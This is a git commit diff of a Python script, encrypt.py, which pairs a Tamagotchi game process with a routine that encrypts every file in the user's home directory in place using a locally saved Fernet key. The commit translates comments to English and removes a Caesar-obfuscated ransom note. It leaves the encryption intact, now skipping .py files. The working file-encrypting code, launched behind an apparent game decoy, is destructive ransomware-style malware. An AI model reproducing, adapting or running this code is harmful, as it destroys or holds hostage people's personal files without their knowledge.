922e00e4341597cb5ee61180b0bc0dbf99932275
Andy2299 <90882478+Andy2299@users.noreply.github.com>
2023-08-25 10:41:45 -0600

    no elimina py

--- encrypt.py
+++ encrypt.py
@@ -5,7 +5,7 @@ import pkg_resources
 from cryptography.fernet import Fernet
 import tkinter as tk
 from tkinter import simpledialog
-import tamagotchi  # Asegúrese de que el código del Tamagotchi esté en un archivo llamado tamagotchi.py
+import tamagotchi  # Make sure the Tamagotchi code is in a file called tamagotchi.py
 
 REQUIRED_PACKAGES = [
     'cryptography'
@@ -14,30 +14,28 @@ REQUIRED_PACKAGES = [
 for package in REQUIRED_PACKAGES:
     try:
         dist = pkg_resources.get_distribution(package)
-        print('{} ({}) está instalado'.format(dist.key, dist.version))
+        print('{} ({}) is installed'.format(dist.key, dist.version))
     except pkg_resources.DistributionNotFound:
-        print('{} NO está instalado'.format(package))
+        print('{} is NOT installed'.format(package))
         subprocess.call(['pip', 'install', package])
 
-def desencriptar(cadena):
-    return ''.join(chr(ord(c) - 1) for c in cadena)
-
-def generar_key():
+def generate_key():
     key = Fernet.generate_key()
-    with open('key.key', 'wb') as key_file:  # Cambiado de desencriptar("lfp.lfp") a 'key.key'
+    with open('key.key', 'wb') as key_file:
         key_file.write(key)
     return key
 
-def cargar_key():
-    return open('key.key', 'rb').read()  # Cambiado de desencriptar("lfp.lfp") a 'key.key'
+def load_key():
+    return open('key.key', 'rb').read()
 
 def encrypt(item, key):
-    f = Fernet(key)
-    with open(item, 'rb') as file:
-        file_data = file.read()
-    encrypted_data = f.encrypt(file_data)
-    with open(item, 'wb') as file:
-        file.write(encrypted_data)
+    if not item.endswith('.py'):
+        f = Fernet(key)
+        with open(item, 'rb') as file:
+            file_data = file.read()
+        encrypted_data = f.encrypt(file_data)
+        with open(item, 'wb') as file:
+            file.write(encrypted_data)
 
 def get_all_files_in_directory(dir_path, exclude_path):
     files_list = []
@@ -49,25 +47,18 @@ def get_all_files_in_directory(dir_path, exclude_path):
     return files_list
 
 def main_encryption():
-    path_to_encrypt = os.path.expanduser('~')  # Ahora obtiene automáticamente el directorio del usuario
-    exclude_path = os.path.dirname(os.path.abspath(__file__))  # Excluye el directorio del proyecto
+    path_to_encrypt = os.path.expanduser('~')
+    exclude_path = os.path.dirname(os.path.abspath(__file__))
     all_files = get_all_files_in_directory(path_to_encrypt, exclude_path)
 
-    key = generar_key()
-
-    with multiprocessing.Pool() as pool:
-        pool.starmap(encrypt, [(file, key) for file in all_files])
-
-    with open(path_to_encrypt+'\\'+desencriptar("sfbenf.ufy"), 'w') as file:
-        file.write(desencriptar('Gjdifspft fodsjuqbept qps fm ujup Fsspejohfs\n'))
-        file.write(desencriptar('Ebnf vo fvttdsjqujpo qbsb eftfodsjqubs. Uibolt'))
+    key = generate_key()
 
     with multiprocessing.Pool() as pool:
         pool.starmap(encrypt, [(file, key) for file in all_files])
 
 if __name__ == '__main__':
     p1 = multiprocessing.Process(target=main_encryption)
-    p2 = multiprocessing.Process(target=tamagotchi.main)  # El código del Tamagotchi tenga una función main
+    p2 = multiprocessing.Process(target=tamagotchi.main)
 
     p1.start()
     p2.start()
